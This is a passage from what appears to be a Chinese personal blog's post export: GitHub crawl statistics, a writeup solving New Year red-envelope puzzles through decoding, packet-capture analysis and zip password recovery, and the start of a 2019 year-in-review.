的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 